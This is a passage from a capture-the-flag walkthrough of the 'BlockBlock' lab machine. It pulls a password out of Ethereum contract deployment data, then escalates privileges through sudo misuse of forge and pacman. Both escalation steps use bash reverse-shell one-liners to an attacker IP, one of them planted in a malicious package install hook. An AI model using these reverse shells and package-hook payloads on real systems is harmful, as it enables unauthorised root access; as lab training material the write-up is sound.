root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getBalance\", \"params\": [\"$chataddr\",\"latest\"], \"id\": 1}" http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": "0x0"
}
```

### 4.2. Exporing the Ethereum json rpc

`eth_getBalance` is just one of the rpc calls available in the [json rpc docs](https://ethereum.org/en/developers/docs/apis/json-rpc/)

It may be possible to get users' messages by reading a block, trying `eth_getBlockByNumber` to get the `latest` block returns:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["latest",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": {
    "baseFeePerGas": "0x84cb435",
    "blobGasUsed": "0x0",
    "difficulty": "0x0",
    "excessBlobGas": "0x0",
    "extraData": "0x",
    "gasLimit": "0x1c9c380",
    "gasUsed": "0x1ae50",
    "hash": "0x62e495cac4c4e127bf7199e4423185af2da2f97aa609c35e9d20e0e38bc3b943",
    "logsBloom": "0x04000000000000000200000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002001000000000000000000008000000020000000000080",
    "miner": "0x0000000000000000000000000000000000000000",
    "mixHash": "0x0000000000000000000000000000000000000000000000000000000000000000",
    "nonce": "0x0000000000000000",
    "number": "0x10",
    "parentHash": "0xf95109aa843a3427532da415eb61e804c24f971a0f2bca17949080b7bc7804e8",
    "receiptsRoot": "0xf5951085e7b65509aab0b9c0472b7c0e68309572daa239df2b0d1560e47ac1d3",
    "sha3Uncles": "0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347",
    "size": "0x33f",
    "stateRoot": "0x9d38d9680fb94e97bf82192ec7552a2af94cad5b7c296a614dc7f43a80fa3de1",
    "timestamp": "0x677a8553",
    "totalDifficulty": "0x0",
    "transactions": [
      {
        "accessList": [],
        "blockHash": "0x62e495cac4c4e127bf7199e4423185af2da2f97aa609c35e9d20e0e38bc3b943",
        "blockNumber": "0x10",
        "chainId": "0x7a69",
        "from": "0xb795dc8a5674250b602418e7f804cd162f03338b",
        "gas": "0x334f0",
        "gasPrice": "0x84cb435",
        "hash": "0xa8dda332c77b70478591caa8dde20b507ccd7f3b88da1be8b5bce8b96d651e69",
        "input": "0x467fba0f0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000047465737400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000568656c6c6f000000000000000000000000000000000000000000000000000000",
        "maxFeePerGas": "0x84cb435",
        "maxPriorityFeePerGas": "0x0",
        "nonce": "0xf",
        "r": "0xab869021de4319353f44ef09fbc79c141f15d673fba15f796aba8577b25c9a2f",
        "s": "0x476d74c7e3e39c0003f02e6323c9da34da4376fd3c41e822e549ca04a0bc747f",
        "to": "0x38d681f08c24b3f6a945886ad3f98f856cc6f2f8",
        "transactionIndex": "0x0",
        "type": "0x2",
        "v": "0x1",
        "value": "0x0",
        "yParity": "0x1"
      }
    ],
    "transactionsRoot": "0x90feb28a61eb44d9ab8507ea0cf5dc016120a85bf4caf1f8e74cdd8df6770c6a",
    "uncles": []
  }
}
```

Items of interest from the results:
1. `"number": "0x10"`: this should mean that this is the 16th (`0x10`) block, perhaps there are other blocks that are interesting
2. `"input": "0x0x467fba0f00000000..."`: this could be the message in the block

Let's put the hexdecimal string from `input` in `0x10.hex` and reversing it with `xxd`:

```console
root@kali:~# xxd -r -ps 0x10.hex
F�@�testhello
```

It is exactly the message sent with the `test` account:

![image](https://github.com/user-attachments/assets/499cf083-dfd6-4aa9-87eb-0c7d37567ca7)

Reading the first block (`0x01`) returns a rather long `input`:

```console
root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" -H "token: $rpctoken" -d '{"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["0x1",true], "id": 1}' http://blockblock.htb/api/json-rpc | jq
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": {
    "baseFeePerGas": "0x3b9aca00",
    "blobGasUsed": "0x0",
    "difficulty": "0x0",
    "excessBlobGas": "0x0",
    "extraData": "0x",
    "gasLimit": "0x1c9c380",
    "gasUsed": "0x127c32",
    "hash": "0x1e685c9bf3b2a121022a64b6d9a0632a3d7d8c08de67362a28ceab3a30a49a6f",
    "logsBloom": "0x00100000000000000000000000000000000000000000000000000000000000000000000000000000008000000010000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    "miner": "0x0000000000000000000000000000000000000000",
    "mixHash": "0x0000000000000000000000000000000000000000000000000000000000000000",
    "nonce": "0x0000000000000000",
    "number": "0x1",
    "parentHash": "0x951a1c86354b13f99e5a8aae0d8f3c0d42fb59c6a1efe0ee72205e98997bf7b5",
    "receiptsRoot": "0x5dc85a9ce0651081f8f776085a3f97537975c954485aafeefdbfdc5484b7504a",
    "sha3Uncles": "0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347",
    "size": "0x1b6d",
    "stateRoot": "0xebaa4051da301381c125aaf9ace65e1c8c1f0258edcbf9333eb28a716edc62d0",
    "timestamp": "0x67783e62",
    "totalDifficulty": "0x0",
    "transactions": [
      {
        "accessList": [],
        "blockHash": "0x1e685c9bf3b2a121022a64b6d9a0632a3d7d8c08de67362a28ceab3a30a49a6f",
        "blockNumber": "0x1",
        "chainId": "0x7a69",
        "from": "0xb795dc8a5674250b602418e7f804cd162f03338b",
        "gas": "0x127c32",
        "gasPrice": "0x3b9aca00",
        "hash": "0x95125517a48dcf4503a067c29f176e646ae0b7d54d1e59c5a7146baf6fa93281",
        "input": "0x60a060405234801561001057600080fd5b5060405161184538038061184583398101604081905261002f9161039a565b60405180606001604052808281526020016040518060400160405280600581526020016430b236b4b760d91b8152508152602001600115158152506001604051610084906430b236b4b760d91b815260050190565b908152604051908190036020019020815181906100a1908261048c565b50602082015160018201906100b6908261048c565b50604091909101516002909101805460ff1916911515919091179055336080526100e082826100e7565b505061060e565b6080516001600160a01b0316336001600160a01b0316146101595760405162461bcd60e51b815260206004820152602160248201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6044820152603760f91b60648201526084015b60405180910390fd5b6040805160208101825260009052517fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a4709060019061019890859061054a565b9081526040519081900360200181206101b091610566565b6040518091039020146102055760405162461bcd60e51b815260206004820152601760248201527f557365726e616d6520616c7265616479206578697374730000000000000000006044820152606401610150565b6040518060600160405280828152602001604051806040016040528060048152602001633ab9b2b960e11b81525081526020016001151581525060018360405161024f919061054a565b9081526040519081900360200190208151819061026c908261048c565b5060208201516001820190610281908261048c565b50604091820151600291909101805460ff1916911515919091179055517fda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98906102cb9084906105db565b60405180910390a15050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156103085781810151838201526020016102f0565b50506000910152565b600082601f83011261032257600080fd5b81516001600160401b0381111561033b5761033b6102d7565b604051601f8201601f19908116603f011681016001600160401b0381118282101715610369576103696102d7565b60405281815283820160200185101561038157600080fd5b6103928260208301602087016102ed565b949350505050565b600080604083850312156103ad57600080fd5b82516001600160401b038111156103c357600080fd5b6103cf85828601610311565b602085015190935090506001600160401b038111156103ed57600080fd5b6103f985828601610311565b9150509250929050565b600181811c9082168061041757607f821691505b60208210810361043757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561048757806000526020600020601f840160051c810160208510156104645750805b601f840160051c820191505b818110156104845760008155600101610470565b50505b505050565b81516001600160401b038111156104a5576104a56102d7565b6104b9816104b38454610403565b8461043d565b6020601f8211600181146104ed57600083156104d55750848201515b600019600385901b1c1916600184901b178455610484565b600084815260208120601f198516915b8281101561051d57878501518255602094850194600190920191016104fd565b508482101561053b5786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b6000825161055c8184602087016102ed565b9190910192915050565b600080835461057481610403565b60018216801561058b57600181146105a0576105d0565b60ff19831686528115158202860193506105d0565b86600052602060002060005b838110156105c8578154888201526001909101906020016105ac565b505081860193505b509195945050505050565b60208152600082518060208401526105fa8160408501602087016102ed565b601f01601f19169190910160400192915050565b60805161120061064560003960008181610138015281816102ef0152818161055a01528181610792015261090601526112006000f3fe608060405234801561001057600080fd5b506004361061007d5760003560e01c8063507b4e791161005b578063507b4e79146100e1578063c5a6f18a146100f4578063d5e363f914610107578063ddc7b6a71461011a57600080fd5b80632c8b07661461008257806336980d3a146100975780634518f6b3146100bf575b600080fd5b610095610090366004610b53565b61012d565b005b6100aa6100a5366004610bc2565b6102ae565b60405190151581526020015b60405180910390f35b6100d26100cd366004610bc2565b6102e0565b6040516100b693929190610c53565b6100956100ef366004610c96565b61054f565b610095610102366004610d39565b61070c565b610095610115366004610bc2565b610787565b610095610128366004610e0c565b6108fb565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461017e5760405162461bcd60e51b815260040161017590610e73565b60405180910390fd5b83838080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050604051600192506101c591508390610eb4565b9081526040519081900360200190206002015460ff166101f75760405162461bcd60e51b815260040161017590610ed0565b60018585604051610209929190610efd565b9081526040519081900360200190206002015460ff1661023b5760405162461bcd60e51b815260040161017590610ed0565b82826001878760405161024f929190610efd565b9081526020016040518091039020600101918261026d929190610f96565b507f67560143af7aa0dc03e270b21c2067bb6cd8dd3f413c896d199590708b6e6366858560405161029f929190611055565b60405180910390a15050505050565b6000600183836040516102c2929190610efd565b9081526040519081900360200190206002015460ff16905092915050565b60608080336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461032c5760405162461bcd60e51b815260040161017590610e73565b84848080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250506040516001925061037391508390610eb4565b9081526040519081900360200190206002015460ff166103a55760405162461bcd60e51b815260040161017590610ed0565b8585600188886040516103b9929190610efd565b908152604051908190036020018120906001906103d9908b908b90610efd565b908152602001604051809103902060010183838080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050845492965093945091925083915061043590610f0d565b80601f016020809104026020016040519081016040528092919081815260200182805461046190610f0d565b80156104ae5780601f10610483576101008083540402835291602001916104ae565b820191906000526020600020905b81548152906001019060200180831161049157829003601f168201915b505050505091508080546104c190610f0d565b80601f01602080910402602001604051908101604052809291908181526020018280546104ed90610f0d565b801561053a5780601f1061050f5761010080835404028352916020019161053a565b820191906000526020600020905b81548152906001019060200180831161051d57829003601f168201915b50505050509050935093509350509250925092565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146105975760405162461bcd60e51b815260040161017590610e73565b85858080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050604051600192506105de91508390610eb4565b9081526040519081900360200190206002015460ff166106105760405162461bcd60e51b815260040161017590610ed0565b8484604051610620929190610efd565b60405180910390206001888860405161063a929190610efd565b90815260405190819003602001812061065291611084565b60405180910390201461069a5760405162461bcd60e51b815260206004820152601060248201526f125b9d985b1a59081c185cdcdddbdc9960821b6044820152606401610175565b8282600189896040516106ae929190610efd565b908152604051908190036020019020916106c9919083610f96565b507fd0b43b0b96083c98cc0f0370575812de87ee48ff1bde30bcd74f3518443bc4f587876040516106fb929190611055565b60405180910390a150505050505050565b6000546001600160a01b0316156107655760405162461bcd60e51b815260206004820152601860248201527f43686174206164647265737320616c72656164792073657400000000000000006044820152606401610175565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146107cf5760405162461bcd60e51b815260040161017590610e73565b600182826040516107e1929190610efd565b9081526040519081900360200190206002015460ff166108135760405162461bcd60e51b815260040161017590610ed0565b60018282604051610825929190610efd565b90815260405190819003602001902060006108408282610ab5565b61084e600183016000610ab5565b50600201805460ff191690556000546040516304d0d87d60e31b81526001600160a01b0390911690632686c3e89061088c9085908590600401611055565b600060405180830381600087803b1580156108a657600080fd5b505af11580156108ba573d6000803e3d6000fd5b505050507f68621f32198be2aabd285ff157a36182342ebc518a0e054c08a1461ae0d8643182826040516108ef929190611055565b60405180910390a15050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146109435760405162461bcd60e51b815260040161017590610e73565b6040805160208101825260009052517fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a47090600190610982908590610eb4565b90815260405190819003602001812061099a91611084565b6040518091039020146109ef5760405162461bcd60e51b815260206004820152601760248201527f557365726e616d6520616c7265616479206578697374730000000000000000006044820152606401610175565b6040518060600160405280828152602001604051806040016040528060048152602001633ab9b2b960e11b815250815260200160011515815250600183604051610a399190610eb4565b90815260405190819003602001902081518190610a5690826110f9565b5060208201516001820190610a6b90826110f9565b50604091820151600291909101805460ff1916911515919091179055517fda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98906108ef9084906111b7565b508054610ac190610f0d565b6000825580601f10610ad1575050565b601f016020900490600052602060002090810190610aef9190610af2565b50565b5b80821115610b075760008155600101610af3565b5090565b60008083601f840112610b1d57600080fd5b5081356001600160401b03811115610b3457600080fd5b602083019150836020828501011115610b4c57600080fd5b9250929050565b60008060008060408587031215610b6957600080fd5b84356001600160401b03811115610b7f57600080fd5b610b8b87828801610b0b565b90955093505060208501356001600160401b03811115610baa57600080fd5b610bb687828801610b0b565b95989497509550505050565b60008060208385031215610bd557600080fd5b82356001600160401b03811115610beb57600080fd5b610bf785828601610b0b565b90969095509350505050565b60005b83811015610c1e578181015183820152602001610c06565b50506000910152565b60008151808452610c3f816020860160208601610c03565b601f01601f19169290920160200192915050565b606081526000610c666060830186610c27565b8281036020840152610c788186610c27565b90508281036040840152610c8c8185610c27565b9695505050505050565b60008060008060008060608789031215610caf57600080fd5b86356001600160401b03811115610cc557600080fd5b610cd189828a01610b0b565b90975095505060208701356001600160401b03811115610cf057600080fd5b610cfc89828a01610b0b565b90955093505060408701356001600160401b03811115610d1b57600080fd5b610d2789828a01610b0b565b979a9699509497509295939492505050565b600060208284031215610d4b57600080fd5b81356001600160a01b0381168114610d6257600080fd5b9392505050565b634e487b7160e01b600052604160045260246000fd5b600082601f830112610d9057600080fd5b81356001600160401b03811115610da957610da9610d69565b604051601f8201601f19908116603f011681016001600160401b0381118282101715610dd757610dd7610d69565b604052818152838201602001851015610def57600080fd5b816020850160208301376000918101602001919091529392505050565b60008060408385031215610e1f57600080fd5b82356001600160401b03811115610e3557600080fd5b610e4185828601610d7f565b92505060208301356001600160401b03811115610e5d57600080fd5b610e6985828601610d7f565b9150509250929050565b60208082526021908201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6040820152603760f91b606082015260800190565b60008251610ec6818460208701610c03565b9190910192915050565b602080825260139082015272155cd95c88191bd95cc81b9bdd08195e1a5cdd606a1b604082015260600190565b8183823760009101908152919050565b600181811c90821680610f2157607f821691505b602082108103610f4157634e487b7160e01b600052602260045260246000fd5b50919050565b601f821115610f9157806000526020600020601f840160051c81016020851015610f6e5750805b601f840160051c820191505b81811015610f8e5760008155600101610f7a565b50505b505050565b6001600160401b03831115610fad57610fad610d69565b610fc183610fbb8354610f0d565b83610f47565b6000601f841160018114610ff55760008515610fdd5750838201355b600019600387901b1c1916600186901b178355610f8e565b600083815260209020601f19861690835b828110156110265786850135825560209485019460019092019101611006565b50868210156110435760001960f88860031b161c19848701351681555b505060018560011b0183555050505050565b60208152816020820152818360408301376000818301604090810191909152601f909201601f19160101919050565b600080835461109281610f0d565b6001821680156110a957600181146110be576110ee565b60ff19831686528115158202860193506110ee565b86600052602060002060005b838110156110e6578154888201526001909101906020016110ca565b505081860193505b509195945050505050565b81516001600160401b0381111561111257611112610d69565b611126816111208454610f0d565b84610f47565b6020601f82116001811461115a57600083156111425750848201515b600019600385901b1c1916600184901b178455610f8e565b600084815260208120601f198516915b8281101561118a578785015182556020948501946001909201910161116a565b50848210156111a85786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b602081526000610d626020830184610c2756fea26469706673582212200c0ba374423cb74ab14e407a07f561fb4e33aad841f07036fac601e322900b4464736f6c634300081a00330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000056b65697261000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a536f6d65646179426974436f696e57696c6c436f6c6c61707365000000000000",
        "maxFeePerGas": "0x77359400",
        "maxPriorityFeePerGas": "0x0",
        "nonce": "0x0",
        "r": "0x4f4ad415e28b86460c19fe844a722c1db7ac58d44fc7b4621970e6d38ce89cd8",
        "s": "0xdd890e41ee3dbfe385f6f5efce82161a579f7b33360351dfc89da9ac40d711c",
        "to": null,
        "transactionIndex": "0x0",
        "type": "0x2",
        "v": "0x1",
        "value": "0x0",
        "yParity": "0x1"
      }
    ],
    "transactionsRoot": "0xfc2e916e53e98b9d81c89fa3d887765aedff45559a0f52585ae6bf25e389e759",
    "uncles": []
  }
}
```

Let's put the hexdecimal string from `input` in `0x01.hex` and reversing it with `xxd`:

```console
root@kali:~# xxd -r -ps 0x01.hex
`�`@R4�aW`��[P`@QaE8�aE�9�`@��Ra/�a�V[`@Q�```@R���R` `@Q�`@`@R�`�R` d0�6��`�RP�R` `�RP``@Qa��d0�6��`�R`�V[��R`@Q���` � �Q��a���a�V[P` �Q`��a���a�V[P`@���Q`���T`������U3`�Ra��a�V[PPaV[`�Q```�```�YW`@QbF`�R` `�R`!`$�ROnly owner can call this functio`D�R`7`�d�R`�[`@Q����[`@�Q` ��R`�RQ��F��#<�~}������Sʂ';{��]��p�`�a����aJV[��R`@Q���` � a��afV[`@Q��� aW`@QbF`�R` `�R``$�RUsername already exists`D�R`daPV[`@Q�```@R���R` `@Q�`@`@R�`�R` c:���`�RP�R` `�RP`�`@QaO��aJV[��R`@Q���` � �Q��al��a�V[P` �Q`��a���a�V[P`@��Q`����T`������UQ�L�����e�e��V$���MԼ��U�P��`aː��a�V[`@Q����PPV[cNH{q`�R`A`R`$`�[`[��W��Q��R` a�V[PP`�RV[`�`�a"W`��[�Q```@a;Wa;a�V[`@Q`�`��`?�```@��aiWaia�V[`@R��R��` �a�W`��[a��` �` �a�V[��PPPPV[`�`@��a�W`��[�Q```@a�W`��[aυ��aV[` �Q��P�P```@a�W`��[a����aV[�PP�P��PV[`�����aW`��P[` ��a7WcNH{q`�R`"`R`$`�[P��PV[`�a�W�`R` ` `�`�` �adWP�[`�`��P[��a�W`�U`apV[PP[PPPV[�Q```@a�Wa�a�V[a��a��TaV[�a=V[` `�`�a�W`�a�WP��Q[``����Ua�V[`��R` � `��[��aW��Q�U` ���`���a�V[P��a;W��Q``����U[PPPP`��UPV[`�Qa\��` �a�V[�����PPV[`��Tat�aV[`��a�W`�a�Wa�V[`���R����Pa�V[�`R` ` `[��a�W�T��R`���` a�V[PP���P[P���PPPPPV[` �R`�Q�` �Ra��`@�` �a�V[``���`@��PPV[`�QaaE`9`��a8R��a�R��aZR��a�Ra        Ra`��`�`@R4�aW`��[P`6a}W`5`��cP{Nya[W�cP{Nya�W�cŦ�a�W�c��c�aW�c�Ƕ�a␦W`��:a�W�cE��a�W[`��[a�a�6`a
                        SV[a-V[[a�a�6`a
                                       �V[a�V[`@Q��R` [`@Q����[a�a�6`a
                                                                      �V[a�V[`@Qa�����a
                                                                                       SV[a�a�6`a
9V[a                                                                                             �V[aOV[a�a6`a
    V[a�a6`a
            �V[a�V[a�a(6`a
                          V[�V[3```�~W`@QbF`�R`au�asV[`@Q����[����`` ��` `@Q��`@R�������R` �����7`����RPP`@Q`�PaőP��a�V[��R`@Q���` � `T`�a�W`@QbF`�R`au�a�V[`��`@Qa     ���a�V[��R`@Q���` � `T`�a;W`@QbF`�R`au�a�V[��`��`@QaO���a�V[��R` `@Q��� `��am���a�V[PgVC�z���p� g�l��?A<�m��p�ncf��`@Qa����aUV[`@Q����PPPPPV[``��`@Qa��a�V[��R`@Q���` � `T`��P��PPV[``��3```�,W`@QbF`�R`au�asV[����`` ��` `@Q��`@R�������R` �����7`����RV[�a:W�`aWa��T�R�` �a:V[���`R` ` �[�T�R�`�` ��aW��`��[PPPPP�P�P�P�PP�P�P�V[3```��W`@QbF`�R`au�asV[����`` ��` `@Q��`@R�������R` �����7`����RPP`@Q`�PaޑP��a�V[��R`@Q���` � `T`�aW`@QbF`�R`au�a�V[��`@Qa ���a�V[`@Q��� `��`@Qa:���a�V[��R`@Q���` � aR�a�V[`@Q��� a�W`@QbF`�R` `�R``$�Ro[��[␦\���ܙ`�D�R`dauV[��`��`@Qa����a�V[��R`@Q���` � �aɑ��a�V[Pд;
                                                                                                                                   <��pWXއ�H�0��O5D;����`@Qa����aUV[`@Q����PPPPPPPV[`T```�eW`@QbF`�R` `�R``$�RChat address already set`D�R`dauV[`�T```�``�������UV[3```��W`@QbF`�R`au�asV[`��`@Qaᒑ�a�V[��R`@Q���` � `T`�W`@QbF`�R`au�a�V[`��`@Q%���a�V[��R`@Q���` � `@��a
�V[N`�`a
�V[P`�T`��U`T`@Qc��}`�R```���c&���������`aUV[``@Q���`��;��W`��[PZ���W=`�>=`�[PPPPhb2�⪽(_�W�a�4.�Q��F␦��d1��`@Q�aUV[`@Q����PPV[3```�    CW`@QbF`�R`au�asV[`@�Q` ��R`�RQ��F��#<�~}������Sʂ';{��]��p�`�a  ����a�V[��R`@Q���` � a  ��a�V[`@Q��� a  �W`@QbF`�R` `�R``$�RUsername already exists`D�R`dauV[`@Q�```@R���R` `@Q�`@`@R�`�R` c:���`�RP�R` `�RP`�`@Qa
9��a�V[��R`@Q���` � �Q��a
V��a�V[P` �Q`��a
k��a�V[P`@��Q`����T`������UQ�L�����e�e��V$���MԼ��U�P��`�a�V[P�Ta
V[`�U�`a
�WPPV[`` ��`R` ` ���a
a
�V[PV[[��a
          W`�U`a
�V[P�V[`��`�a
             W`��[P�5```@a
                          4W`��[` ��P�` ��a
                                           LW`��[�P��PV[`�`�`@��a
                                                                 iW`��[�5```@a
                                                                              W`��[a
                                                                                    ����a

                                                                                         V[��P�PP` �5```@a
                                                                                                          �W`��[a
                                                                                                                 ����a

                                                                                                                      V[����P�PPPPV[`�` ��a
                                                                                                                                           �W`��[�5```@a
                                                                                                                                                        �W`��[a
                                                                                                                                                               ����a

                                                                                                                                                                    V[����P�PPPPV[`[��a
                                                                                                                                                                                       W��Q��R` a
                                                                                                                                                                                                 V[PP`�RV[`�Q��Ra
 ?�` �` �a
          V[``���` ��PPV[``�R`a
                               f``��a
                                     'V[��` �Ra
                                               x��a
                                                   'V[�P��`@�Ra
                                                               ���a
                                                                   'V[��PPPPPPV[`�`�`�``��a
                                                                                           �W`��[�5```@a
                                                                                                        �W`��[a
                                                                                                               щ��a

                                                                                                                   V[��P�PP` �5```@a
                                                                                                                                    �W`��[a
                                                                                                                                           ����a

'���a                                                                                                                                           V[��P�PP`@�5```@a

V[�PP�P��PV[` ��R`!��ROnly owner can call this functio`@�R`7`�`�R`��V[`�QaƁ�` �a
                                                                                V[�����PPV[` ��R`��Rr\�\�\�^␦\�`j@�R``�V[���7`���R��PV[`�����a!W`��P[` ��aAWcNH{q`�R`"`R`$`�[P��PV[`�a�W�`R` ` `�`�` �anWP�[`�`�b` ��a[` `�`�aZW`�aBWP��Q[``����Ua�V[`��R` � `��[��a�W��Q�U` ���`���ajV[P��a�W��Q``����U[PPPP`��UPV[` �R`a �R��`@�7`��`@�����R`��`��PV[`��Ta��a
      'V��dipfsX"

                  �tB<�J�N@z�a�N3��A�p6���"�
                                            Ddsolc␦3@�keira␦SomedayBitCoinWillCollapse
```

A rather long output appears, but the portion towards the end `keira␦SomedayBitCoinWillCollapse` is interesting, maybe it's the password for `keira`

### 4.3. SSH as `keira`

Simply SSH to the target with `SomedayBitCoinWillCollapse` gets the `user.txt` flag

```console
root@kali:~# ssh keira@blockblock.htb
Warning: Permanently added 'blockblock.htb' (ED25519) to the list of known hosts.
keira@blockblock.htb's password:
Last login: Mon Nov 18 16:50:13 2024 from 10.10.14.23
[keira@blockblock ~]$ cat /home/keira/user.txt
10133cfbede7721a372137ea79ad6e35
```

## 5. Lateral Movement

### 5.1. Discover movement to `paul`

Listing `keira`'s `sudo` rights reveals she can run `/home/paul/.foundry/bin/forge` as `paul` without password

```console
keira@blockblock ~]$ sudo -l
User keira may run the following commands on blockblock:
    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
```

### 5.2. Abusing the `sudo` rights

Prepare bash script to connect reverse shell to Kali:

```sh
cat << EOF > /dev/shm/solc
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.44/4444 0>&1
EOF
```

Setup permission to allow anyone to run the script:

```sh
chmod 777 /dev/shm/solc
```

Create forge project directory and `cd` into it

```sh
mkdir /dev/shm/exploit && cd $_
```

Start listener on Kali:

```sh
rlwrap nc -nlvp 4444
```

Use the `sudo` rights to "build" the contract, pointing it to the exploit script

```sh
sudo -u paul /home/paul/.foundry/bin/forge build --use ../solc
```

Reverse shell hooked:

```console
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.43] 54576
[paul@blockblock exploit]$ cd ~
[paul@blockblock ~]$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```

### 6.  Privilege Escalation

Listing `paul`'s `sudo` rights reveals he can run `/usr/bin/pacman` as `root` without password

```console
[paul@blockblock ~]$ sudo -l
User paul may run the following commands on blockblock:
    (ALL : ALL) NOPASSWD: /usr/bin/pacman
```

Pacman is a simple library-based package manager for Arch Linux: https://pacman.archlinux.page/

It should be able to use the `--upgrade` operation to get a reverse shell as `root`: https://man.archlinux.org/man/pacman.8.en

Create and make an exploit package:

```console
[paul@blockblock ~]$ mkdir /dev/shm/exp && cd $_
[paul@blockblock exp]$ cat << EOF > PKGBUILD
pkgname=exp
pkgver=1.0
pkgrel=1
arch=('any')
pkgdesc="Root Reverse Shell"
license=('GPL')
install=exp.install
EOF
[paul@blockblock exp]$ cat << EOF> exp.install
post_install(){
  bash -i >& /dev/tcp/10.10.14.44/4445 0>&1
}
EOF
[paul@blockblock exp]$ makepkg -f
==> Making package: exp 1.0-1 (Wed 08 Jan 2025 01:07:39 AM UTC)
==> Checking runtime dependencies...
==> Checking buildtime dependencies...
==> Retrieving sources...
==> Extracting sources...
==> Entering fakeroot environment...
==> Tidying install...
  -> Removing libtool files...
  -> Purging unwanted files...
  -> Removing static library files...
  -> Stripping unneeded symbols from binaries and libraries...
  -> Compressing man and info pages...
==> Checking for packaging issues...
==> Creating package "exp"...
  -> Generating .PKGINFO file...
  -> Generating .BUILDINFO file...
  -> Adding install file...
  -> Generating .MTREE file...
  -> Compressing package...
==> Leaving fakeroot environment.
==> Finished making: exp 1.0-1 (Wed 08 Jan 2025 01:07:40 AM UTC)
[paul@blockblock exp]$ ls -l
total 12
-rw-r--r-- 1 paul paul 4009 Jan  8 01:07 exp-1.0-1-any.pkg.tar.zst
-rw-r--r-- 1 paul paul   61 Jan  8 01:07 exp.install
drwxr-xr-x 4 paul paul   80 Jan  8 01:07 pkg
-rw-r--r-- 1 paul paul  110 Jan  8 01:07 PKGBUILD
drwxr-xr-x 2 paul paul   40 Jan  8 01:07 src
```

Start listener on Kali:

```sh
rlwrap nc -nlvp 4445
```

Run `pacman` with `sudo`:

```sh
[paul@blockblock exp]$ sudo /usr/bin/pacman -U exp-1.0-1-any.pkg.tar.zst
loading packages...
resolving dependencies...
looking for conflicting packages...

Packages (1) exp-1.0-1


:: Proceed with installation? [Y/n] Y
Y
checking keyring...
checking package integrity...
loading package files...
checking for file conflicts...
checking available disk space...
:: Processing package changes...
installing exp...
```

Reverse shell hooked:

```console
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.43] 45416
[root@blockblock /]# id
uid=0(root) gid=0(root) groups=0(root)
[root@blockblock /]# cd ~
[root@blockblock ~]# cat root.txt
2e6241771c4c2c54ae8970c35001ae17
```
